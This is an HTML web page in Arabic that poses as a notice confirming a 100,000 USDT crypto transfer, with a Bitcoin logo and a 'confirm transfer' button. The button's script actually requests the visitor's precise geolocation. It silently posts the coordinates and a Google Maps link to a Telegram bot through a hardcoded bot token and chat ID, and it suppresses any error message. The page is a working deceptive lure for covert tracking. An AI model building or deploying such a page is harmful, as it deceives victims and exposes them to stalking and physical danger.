<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>تهانينا</title>
  <style>
    body {
      background: #000;
      color: gold;
      text-align: center;
      font-family: Arial, sans-serif;
    }
    img {
      width: 180px;
      margin-top: 30px;
    }
    h1 {
      font-size: 28px;
      margin: 20px 0;
    }
    button {
      font-size: 20px;
      padding: 12px 30px;
      background: gold;
      border: none;
      color: black;
      border-radius: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1200px-Bitcoin.svg.png" alt="Bitcoin Logo" />
  <h1>تهانينا! تم قبول طلب تحويل 100,000 USDT</h1>
  <button onclick="getLocation()">تأكيد تحويل المال</button>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, errorHandler, {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        });
      }
    }

    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      fetch('https://api.telegram.org/bot8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0/sendMessage', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: 7485197107,
          text: `📍 موقع جديد:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`
        })
      });
    }

    function errorHandler(error) {
      // بلا رسالة
    }
  </script>
</body>
</html>
